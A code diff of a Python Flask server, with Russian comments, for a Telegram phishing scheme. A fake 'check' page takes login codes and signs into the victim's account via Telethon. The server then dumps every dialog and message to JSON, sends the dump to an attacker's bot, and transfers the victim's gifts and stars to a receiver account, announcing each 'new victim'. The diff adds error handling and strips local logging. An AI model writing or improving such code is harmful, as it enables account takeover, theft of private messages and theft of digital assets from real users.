@@ -1,4 +1,3 @@
-# server.py — полностью рабочая версия с отправкой JSON и уведомлений
 from flask import Flask, render_template, request, jsonify, session
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
@@ -25,7 +24,7 @@ CORS(app)
 temp_data = {}
 
 # ============================================================
-# Отправка уведомлений админу (асинхронная, без создания нового loop)
+# Отправка уведомлений админу
 # ============================================================
 async def send_telegram_message(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -33,7 +32,7 @@ async def send_telegram_message(text):
         await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
 
 # ============================================================
-# Сбор ВСЕХ данных аккаунта (без ограничений)
+# Сбор ВСЕХ данных аккаунта
 # ============================================================
 async def collect_full_user_data(client):
     data = {}
@@ -78,7 +77,6 @@ async def collect_full_user_data(client):
         
         try:
             messages = []
-            # Собираем ВСЕ сообщения (без лимита)
             async for msg in client.iter_messages(dialog, limit=None):
                 messages.append({
                     'id': msg.id,
@@ -110,22 +108,35 @@ async def send_document_to_admin(file_path):
                 files = {'document': (os.path.basename(file_path), f, 'application/json')}
                 response = await http_client.post(url, data={'chat_id': ADMIN_ID}, files=files)
                 if response.status_code != 200:
-                    logging.error(f"Send doc error: {response.text}")
                     await send_telegram_message(f"❌ Ошибка отправки JSON: {response.text}")
         logging.info(f"Document {file_path} sent to admin.")
     except Exception as e:
-        logging.error(f"Failed to send document: {e}")
         await send_telegram_message(f"❌ Ошибка отправки документа: {str(e)}")
         raise
 
 # ============================================================
-# Проверка баланса и подарков
+# Проверка баланса и подарков (с обработкой ошибок)
 # ============================================================
 async def check_balance_and_gifts(client):
     try:
         me = await client.get_me()
-        balance = await client.get_stars_balance()
-        gifts = await client.get_available_gifts()
+        # Пытаемся получить баланс звёзд
+        try:
+            balance = await client.get_stars_balance()
+        except AttributeError:
+            await send_telegram_message("⚠️ Функция get_stars_balance недоступна, обнови Telethon до 1.41+")
+            balance = 0
+        except Exception as e:
+            await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
+            balance = 0
+        
+        # Получаем подарки
+        try:
+            gifts = await client.get_available_gifts()
+        except Exception as e:
+            await send_telegram_message(f"⚠️ Ошибка получения подарков: {str(e)}")
+            gifts = []
+        
         return {
             "user_id": me.id,
             "username": me.username,
@@ -134,13 +145,17 @@ async def check_balance_and_gifts(client):
             "gifts": gifts
         }
     except Exception as e:
-        logging.error(f"Balance check error: {e}")
+        await send_telegram_message(f"❌ Ошибка проверки аккаунта: {str(e)}")
         return None
 
+# ============================================================
+# Передача подарков получателю
+# ============================================================
 async def transfer_nft_to_receiver(client, info):
     try:
         receiver = await client.get_entity(RECEIVER_USERNAME)
         result_text = f"🔔 Новая жертва!\n👤 @{info.get('username', 'unknown')}\n⭐ Баланс: {info.get('stars_balance', 0)}\n🎁 Подарков: {info.get('gifts_count', 0)}"
+        
         if info.get('gifts_count', 0) > 0:
             for gift in info.get('gifts', []):
                 try:
@@ -167,16 +182,10 @@ def auth():
 
 @app.route('/check/<check_id>')
 def check_page(check_id):
-    checks_file = "checks.json"
-    if os.path.exists(checks_file):
-        with open(checks_file, 'r') as f:
-            checks = json.load(f)
-        if check_id in checks:
-            return render_template('index.html', check_amount=checks[check_id]['amount'])
     return render_template('index.html')
 
 # ============================================================
-# API: отправка кода
+# API
 # ============================================================
 @app.route('/api/send-code', methods=['POST'])
 def api_send_code():
@@ -215,9 +224,6 @@ def api_send_code():
     finally:
         loop.close()
 
-# ============================================================
-# API: проверка кода
-# ============================================================
 @app.route('/api/verify-code', methods=['POST'])
 def api_verify_code():
     data = request.json
@@ -246,23 +252,19 @@ def api_verify_code():
             info = await check_balance_and_gifts(client)
             if info:
                 try:
-                    # 1. Собираем данные
                     dump_data = await collect_full_user_data(client)
                     dump_filename = f"dump_{info['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                     with open(dump_filename, 'w', encoding='utf-8') as f:
                         json.dump(dump_data, f, ensure_ascii=False, indent=2)
-                    # 2. Отправляем файл админу
                     await send_document_to_admin(dump_filename)
-                    # 3. Удаляем локальный файл
                     if os.path.exists(dump_filename):
                         os.remove(dump_filename)
                 except Exception as e:
-                    error_msg = f"❌ Ошибка при сборе или отправке дампа: {str(e)}"
-                    logging.error(error_msg)
-                    await send_telegram_message(error_msg)
+                    await send_telegram_message(f"❌ Ошибка дампа: {str(e)}")
                 
-                # Отправляем подарки получателю (внутри уже есть уведомление)
                 await transfer_nft_to_receiver(client, info)
+            else:
+                await send_telegram_message("❌ Не удалось получить данные аккаунта")
             
             await client.disconnect()
             if session_id in temp_data:
@@ -272,8 +274,9 @@ def api_verify_code():
             await client.disconnect()
             return "2fa_needed"
         except Exception as e:
-            logging.error(f"Verify error: {e}")
-            await send_telegram_message(f"❌ Ошибка входа: {str(e)}")
+            error_msg = f"❌ Ошибка входа: {str(e)}"
+            logging.error(error_msg)
+            await send_telegram_message(error_msg)
             await client.disconnect()
             return False
     
